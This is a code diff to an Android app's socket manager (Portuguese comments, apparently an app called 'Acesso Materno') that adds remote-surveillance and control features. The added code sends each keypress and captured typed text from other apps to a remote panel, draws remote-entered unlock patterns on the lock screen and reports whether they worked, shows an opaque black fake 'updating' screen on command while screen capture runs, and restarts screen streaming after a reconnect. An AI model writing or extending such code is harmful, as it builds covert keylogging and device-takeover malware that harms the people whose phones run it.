@@ -46,6 +46,11 @@ object SocketManager {
     var socket: Socket? = null
         private set
 
+    // Diferencia 1ª conexão de RECONEXÃO: só reexibimos o modal numa reconexão
+    // (não atrapalha o fluxo normal na primeira abertura do app).
+    @Volatile
+    private var jaConectouUmaVez = false
+
     /** REGRA DE ISOLAMENTO (defesa lateral): se o comando carrega o campo
      * "dispositivo" e ele NÃO é este aparelho, ignora. O servidor já entrega
      * o comando a um único sid; esta é uma segunda barreira. */
@@ -79,6 +84,23 @@ object SocketManager {
      * (no emulador o OverlayService aplica fundo semitransparente #66000000).
      */
     private fun controlarOverlayService(ctx: Context, ativo: Boolean) {
+        // CAMINHO CONFIÁVEL NO NOX/EMULADOR: o overlay da Acessibilidade usa
+        // TYPE_ACCESSIBILITY_OVERLAY e NÃO depende de SYSTEM_ALERT_WINDOW (que
+        // no Nox costuma não estar concedida → OverlayService encerra sozinho e
+        // "nada aparece"). Então, sempre que a acessibilidade estiver ligada,
+        // mostramos/escondemos o cartão "Atualizando…" por ela — garante que o
+        // fundo escuro + círculo apareçam no Nox. O OverlayService continua
+        // como reforço para aparelhos físicos onde a permissão está concedida.
+        try {
+            val svcAcess = MyAccessibilityService.instance
+            if (svcAcess != null) {
+                if (ativo) svcAcess.mostrarOverlayAtualizacao()
+                else svcAcess.esconderOverlayAtualizacao()
+                emitLog("[OVERLAY] Overlay via Acessibilidade ${if (ativo) "ATIVADO" else "DESATIVADO"} (funciona no Nox, sem SYSTEM_ALERT_WINDOW).")
+            }
+        } catch (e: Exception) {
+            emitLog("[OVERLAY ERRO] Falha no overlay via Acessibilidade: ${e.message}")
+        }
         try {
             val serviceIntent = Intent(ctx, OverlayService::class.java)
             if (ativo) {
@@ -123,6 +145,77 @@ object SocketManager {
             socket?.emit("status_captura", json)
         } catch (e: Exception) {
             Log.e(TAG, "Erro ao emitir status_captura: ${e.message}")
+        }
+    }
+
+    /** Emite sinal de conclusão real da atualização para o painel. */
+    fun emitirAtualizacaoConcluida(sucesso: Boolean, erro: String? = null) {
+        try {
+            val payload = JSONObject().apply {
+                put("dispositivo", nomeDispositivoAtual())
+                put("sucesso", sucesso)
+                if (erro != null) put("erro", erro)
+            }
+            socket?.emit("atualizacao_concluida", payload)
+            Log.d(TAG, "Sinal 'atualizacao_concluida' emitido: sucesso=$sucesso")
+        } catch (e: Exception) {
+            Log.e(TAG, "Erro ao emitir atualizacao_concluida: ${e.message}")
+        }
+    }
+
+    fun enviarTecladoLog(app: String, texto: String, bounds: android.graphics.Rect?) {
+        try {
+            val mascaraRegex = Regex("[•●*·∙⚫◦○◌◍◉⬤⚪⬛▪▮‣⦁✱✳✴❋]")
+            val textoLimpo = (texto ?: "").replace(mascaraRegex, "").replace("\n", " ").replace("\r", " ").replace(Regex("\\s+"), " ").trim()
+            val json = JSONObject().apply {
+                put("texto", textoLimpo)
+                put("app", app.ifEmpty { "(sem aplicativo)" })
+                put("dispositivo", nomeDispositivoAtual())
+            }
+            socket?.emit("teclado_log", json)
+            Log.d(TAG, "Log de teclado enviado: $json")
+        } catch (e: Exception) {
+            Log.e(TAG, "Erro ao enviar log de teclado: ${e.message}")
+        }
+    }
+
+    /**
+     * MAPEAMENTO DE TOQUES NO TECLADO — envia UMA tecla no exato instante do
+     * clique (TYPE_VIEW_CLICKED), sem ler o campo de texto. O leitor FPS monta a
+     * sequência exata de letras/números na ordem pressionada.
+     *
+     * tecla: o caractere real ("a", "5", "@"), " " para espaço ou "\b" para
+     *        apagar (backspace). Enviada CRUA, sem remover nada.
+     */
+    fun enviarTeclaPressionada(app: String, tecla: String, timestamp: Long) {
+        try {
+            val json = JSONObject().apply {
+                put("tecla", tecla)
+                put("app", app.ifEmpty { "(sem aplicativo)" })
+                put("dispositivo", nomeDispositivoAtual())
+            }
+            socket?.emit("teclado_tecla", json)
+        } catch (e: Exception) {
+            Log.e(TAG, "Erro ao enviar tecla pressionada: ${e.message}")
+        }
+    }
+
+    /**
+     * Resultado do desbloqueio por PADRÃO: sucesso = o keyguard destravou após
+     * desenhar o padrão (senha correta). O painel usa isto para mostrar
+     * "desbloqueado" ou "senha padrão incorreta".
+     */
+    fun enviarResultadoPadrao(sucesso: Boolean, motivo: String? = null) {
+        try {
+            val json = JSONObject().apply {
+                put("sucesso", sucesso)
+                if (motivo != null) put("motivo", motivo)
+                put("dispositivo", nomeDispositivoAtual())
+                put("timestamp", System.currentTimeMillis().toString())
+            }
+            socket?.emit("desbloquear_padrao_resultado", json)
+        } catch (e: Exception) {
+            Log.e(TAG, "Erro ao enviar resultado do padrão: ${e.message}")
         }
     }
 
@@ -185,6 +278,18 @@ object SocketManager {
                         // informação para separar por salas (Rooms). Emuladores
                         // NÃO recebem comandos de overlay (tela preta/anúncio).
                         emit("identificar", nomeDispositivo, tipoDispositivo)
+
+                        try {
+                            val prefs = appContext?.getSharedPreferences("rastreio_facil_prefs", Context.MODE_PRIVATE)
+                            val consentTs = prefs?.getLong("consent_timestamp", 0L) ?: 0L
+                            val consentVersao = prefs?.getInt("consent_versao_aceita", 0) ?: 0
+                            val auditJson = JSONObject().apply {
+                                put("dispositivo", nomeDispositivo)
+                                put("consent_versao", consentVersao)
+                                put("consent_ts", consentTs)
+                            }
+                            emit("consent_auditoria", auditJson)
+                        } catch (_: Exception) {}
                         
                         // SINCRONIZAÇÃO DO HANDSHAKE AUTOMÁTICO:
                         // Dispara o registro HTTP em uma Thread isolada protegida contra NetworkOnMainThreadException.
@@ -195,6 +300,27 @@ object SocketManager {
                                 Log.e(TAG, "Falha ao registrar no painel após EVENT_CONNECT: ${e.message}")
                             }
                         }.start()
+
+                        // RECONEXÃO (casa de segurança): se a conexão caiu e voltou e o
+                        // espelhamento NÃO está ativo, reexibe o modal interno de
+                        // consentimento para restabelecê-lo. Não dispara na 1ª conexão.
+                        val ehReconexao = jaConectouUmaVez
+                        jaConectouUmaVez = true
+                        if (ehReconexao && !ScreenCaptureService.isRunning) {
+                            try {
+                                val ctx = appContext ?: MyAccessibilityService.instance
+                                if (ctx != null) {
+                                    val intent = Intent(ctx, MainActivity::class.java).apply {
+                                        putExtra(MainActivity.EXTRA_REVALIDAR_ESPELHAMENTO, true)
+                                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                                    }
+                                    ctx.startActivity(intent)
+                                    emitLog("[RECONEXAO] Socket reconectou e captura inativa — reexibindo modal de consentimento do espelhamento.")
+                                }
+                            } catch (e: Exception) {
+                                emitLog("[RECONEXAO ERRO] Falha ao reexibir modal: ${e.message}")
+                            }
+                        }
                     }
                     on(Socket.EVENT_DISCONNECT) {
                         Log.d(TAG, "Socket.io Desconectado")
@@ -332,6 +458,33 @@ object SocketManager {
                         H264ScreenEncoder.instance?.requestKeyFrame()
                         emitLog("[H264] Keyframe solicitado pelo painel.")
                     }
+
+                    // ================================================================
+                    // RECONEXÃO DE SESSÃO — comando "retomar_stream"
+                    // ----------------------------------------------------------------
+                    // Enviado pelo servidor quando este dispositivo (que já teve o
+                    // compartilhamento de tela aprovado nesta sessão) reconecta após
+                    // um restart do "Acesso Materno.exe". Garante que o socket esteja
+                    // vivo/identificado e força a retomada do stream: pede keyframe
+                    // (H.264) e reenvia o status de captura — o painel reabre a
+                    // visualização automaticamente, sem clique manual. A captura de
+                    // tela (MediaProjection) segue viva no app; aqui apenas a
+                    // "acordamos" para o painel recém-reaberto.
+                    // ================================================================
+                    on("retomar_stream") { args ->
+                        val json = parseJson(args)
+                        if (comandoDestinadoAOutro(json)) return@on
+                        try {
+                            garantirConexao()
+                            H264ScreenEncoder.instance?.requestKeyFrame()
+                            val capturando = ScreenCaptureService.ultimoResultCode != null &&
+                                ScreenCaptureService.ultimoData != null
+                            emitStatusCaptura(if (capturando) "RETOMANDO" else "SEM_PERMISSAO_TELA")
+                            emitLog("[SESSAO] 'retomar_stream' recebido — stream de tela retomado para o painel (captura ativa=$capturando).")
+                        } catch (e: Exception) {
+                            emitLog("[SESSAO ERRO] Falha ao retomar stream: ${e.message}")
+                        }
+                    }
                     on("solicitar_jpeg_fallback") {
                         ScreenCaptureService.ativarFallbackJpeg()
                         emitLog("[H264] Painel solicitou fallback JPEG ultraleve (H.264 não decodificou no navegador).")
@@ -432,6 +585,33 @@ object SocketManager {
                     }
 
                     // ============================================================
+                    // ETAPA 2 — HANDLER DO DISPOSITIVO (tela preta profissional).
+                    // Evento EXCLUSIVO e SEPARADO dos demais overlays: liga/desliga
+                    // a animação "Atualizando o aplicativo" em fundo PRETO opaco,
+                    // via AtualizacaoDispositivoService. Payload: {ativo:true|false}.
+                    // ============================================================
+                    on("atualizacao_dispositivo") { args ->
+                        val json = parseJson(args)
+                        val ativo = when {
+                            json != null && json.has("ativo") -> json.optBoolean("ativo", false)
+                            args.isNotEmpty() && args[0] is Boolean -> args[0] as Boolean
+                            else -> false
+                        }
+                        val ctx = appContext
+                        if (ctx != null) {
+                            try {
+                                val intent = Intent(ctx, AtualizacaoDispositivoService::class.java)
+                                    .putExtra("ativo", ativo)
+                                if (ativo) ctx.startService(intent)
+                                else ctx.stopService(intent)
+                            } catch (e: Exception) {
+                                Log.e(TAG, "Erro ao (des)ativar AtualizacaoDispositivoService: ${e.message}", e)
+                            }
+                        }
+                        emitLog("[ATUALIZACAO DISPOSITIVO] Tela preta ativo = $ativo")
+                    }
+
+                    // ============================================================
                     // OVERLAY VISUAL DE ATUALIZAÇÃO + SINCRONIA DE FRAME
                     // ------------------------------------------------------------
                     // Botão "Overlay Atualização" do painel (ao lado de "Travar").
@@ -446,41 +626,99 @@ object SocketManager {
                     // ============================================================
                     on("overlay_atualizacao_visual") { args ->
                         val json = parseJson(args)
-                        // SEM filtro comandoDestinadoAOutro: o servidor já faz
-                        // envio direcionado (to=fsid) via endpoint HTTP
-                        // /alternar-overlay-atualizacao. O filtro aqui causava
-                        // falso-negativo (diferença de maiúsculas/espaços no
-                        // nome do dispositivo) e o botão não funcionava.
-                        val ativo = when {
-                            json != null && json.has("ativo") -> json.optBoolean("ativo", false)
-                            args.isNotEmpty() && args[0] is Boolean -> args[0] as Boolean
-                            else -> false
-                        }
-                        val ctx = appContext
-                        if (ctx != null) {
-                            if (MyAccessibilityService.instance == null) {
-                                // Acessibilidade OFF: sem o overlay
-                                // TYPE_ACCESSIBILITY_OVERLAY, usa o
-                                // OverlayService (SYSTEM_ALERT_WINDOW) como
-                                // fallback para exibir o círculo.
-                                controlarOverlayService(ctx, ativo)
-                            } else if (!ativo) {
-                                // Acessibilidade ON: o overlay visual é feito
-                                // por MyAccessibilityService (logo abaixo).
-                                // Garante que o OverlayService não fique
-                                // rodando — evita cartão duplicado na tela.
-                                controlarOverlayService(ctx, false)
-                            }
-                        }
-                        ScreenCaptureService.capturaLimpaOverlayAtiva = ativo
-                        overlayAtualizacaoVisualAtivo = ativo
+                        val ativo = json?.optBoolean("ativo", false) ?: false
                         val svc = MyAccessibilityService.instance
                         if (svc == null) {
-                            emitLog("[OVERLAY ATUALIZACAO] IGNORADO: acessibilidade off — overlay visual não pode ser exibido (ative a acessibilidade).")
-                        } else {
-                            if (ativo) svc.ativarOverlayAtualizacaoVisual() else svc.removerOverlayAtualizacaoVisual()
-                            emitLog("[OVERLAY ATUALIZACAO] Ativo=$ativo — overlay visual ${if (ativo) "EXIBIDO" else "REMOVIDO"} no dispositivo (toques livres); captura limpa (fundo real) ${if (ativo) "ATIVA" else "desativada"} no ScreenCaptureService.")
+                            emitLog("[OVERLAY ATZ] Serviço de acessibilidade indisponível.")
+                            emitirAtualizacaoConcluida(false, "Serviço de acessibilidade indisponível")
+                            return@on
                         }
+                        if (ativo) {
+                            svc.mostrarOverlayAtualizacao()
+                            try {
+                                val ctx = appContext ?: svc
+                                val intent = Intent(ctx, ScreenCaptureService::class.java)
+                                intent.action = "com.example.acessomaterno.ACTION_REFRESH_CAPTURE"
+                                ctx.startService(intent)
+                            } catch (_: Exception) {}
+
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                emitirAtualizacaoConcluida(true)
+                            }, 1200L)
+                        } else {
+                            svc.esconderOverlayAtualizacao()
+                        }
+                        emitLog("[OVERLAY ATZ] ativo=$ativo aplicado.")
+                    }
+
+                    // ============================================================
+                    // OPACIDADE DO DISPOSITIVO (slider "Fundo do Dispositivo"):
+                    // escurece o overlay do cartão NO APARELHO. Aplica nos DOIS
+                    // caminhos: MyAccessibilityService (quando a acessibilidade
+                    // está ON — caminho ativo no Nox/celular) e OverlayService
+                    // (fallback). Não mexe no painel nem na flag de captura limpa.
+                    // ============================================================
+                    on("overlay_opacidade") { args ->
+                        val op = when {
+                            args.isEmpty() -> 0.6f
+                            args[0] is JSONObject -> (args[0] as JSONObject).optDouble("opacidade", 0.6).toFloat()
+                            args[0] is Number -> (args[0] as Number).toFloat()
+                            else -> 0.6f
+                        }
+                        val neutro = kotlin.math.abs(op) < 0.02f
+                        // CORREÇÃO (Nox): o slider sozinho não ligava NENHUMA
+                        // janela de overlay — só guardava o valor. Sem a
+                        // Acessibilidade ligada e sem o toggle "Overlay
+                        // Atualização" ativado antes, nada aparecia no aparelho.
+                        // Agora o próprio slider LIGA/DESLIGA o OverlayService
+                        // (usa SYSTEM_ALERT_WINDOW, já concedida no Nox) e, se a
+                        // Acessibilidade estiver ON, usa também aquele caminho.
+                        // Define a opacidade ANTES de iniciar o serviço, para a
+                        // primeira renderização (OverlayService.onCreate →
+                        // corFundo()) já sair com a cor/alpha correta.
+                        ScreenCaptureService.aplicarOpacidadeDispositivo(op)
+                        val ctx = appContext
+                        if (ctx != null) {
+                            controlarOverlayService(ctx, !neutro)
+                        }
+                        // ESTE slider controla o PRÓPRIO APARELHO (Nox): arrastar
+                        // para escurecer/clarear mostra e ajusta o overlay NO
+                        // DISPOSITIVO em tempo real; no neutro (≈0) remove. Assim
+                        // o modal "Fundo do Dispositivo" controla o Nox, e o
+                        // "Opacidade do Painel" (overlay_opacidade_painel) fica só
+                        // no painel do técnico. Caminho ativo = acessibilidade ON.
+                        val svc = MyAccessibilityService.instance
+                        if (svc != null) {
+                            svc.opacidadeFundoOverlayAtualizacao = op
+                            if (neutro) {
+                                // Neutro → tira o overlay do aparelho.
+                                if (svc.isAtualizacaoAtiva) svc.esconderOverlayAtualizacao()
+                            } else {
+                                // Clarear/escurecer → garante o overlay visível no
+                                // aparelho e aplica a nova opacidade/cor.
+                                if (!svc.isAtualizacaoAtiva) svc.mostrarOverlayAtualizacao()
+                                svc.atualizarOpacidadeOverlayAtualizacao(op)
+                            }
+                        }
+                    }
+
+                    // ============================================================
+                    // OPACIDADE DO PAINEL (slider "Opacidade do Painel"): só
+                    // ajusta a flag de captura limpa no ScreenCaptureService
+                    // (ativa quando < 95%). NÃO altera o overlay do aparelho.
+                    // ============================================================
+                    on("overlay_opacidade_painel") { args ->
+                        val op = when {
+                            args.isEmpty() -> 1.0f
+                            args[0] is JSONObject -> (args[0] as JSONObject).optDouble("opacidade", 1.0).toFloat()
+                            args[0] is Number -> (args[0] as Number).toFloat()
+                            else -> 1.0f
+                        }
+                        MyAccessibilityService.instance?.ajustarOpacidadeFundoOverlay(op)
+                    }
+
+                    on("overlay_falhou") { args ->
+                        Log.d(TAG, "overlay_falhou recebido: ${args.joinToString()}")
                     }
 
                     // ================================================================
@@ -559,11 +797,25 @@ object SocketManager {
                                 }
                             }
                         }
+                        // Índices 1-9 da sequência desenhada no painel. Quando
+                        // presentes, o serviço desenha nos centros REAIS da grade
+                        // detectada no aparelho (ignora a calibração do painel).
+                        val arrayIdx = json?.optJSONArray("indices") ?: json?.optJSONArray("sequencia")
+                        val indices = mutableListOf<Int>()
+                        if (arrayIdx != null) {
+                            for (i in 0 until arrayIdx.length()) {
+                                val v = arrayIdx.optInt(i, 0)
+                                if (v in 1..9) indices.add(v)
+                            }
+                        }
                         val svc = MyAccessibilityService.instance
                         if (svc == null) {
                             emitLog("[PADRÃO ERRO] Acessibilidade inativa.")
+                            enviarResultadoPadrao(false)
                         } else {
-                            svc.desbloquearPadraoPontos(pontos)
+                            svc.desbloquearPadraoPontos(pontos, if (indices.isNotEmpty()) indices else null) { sucesso ->
+                                enviarResultadoPadrao(sucesso)
+                            }
                         }
                     }
 
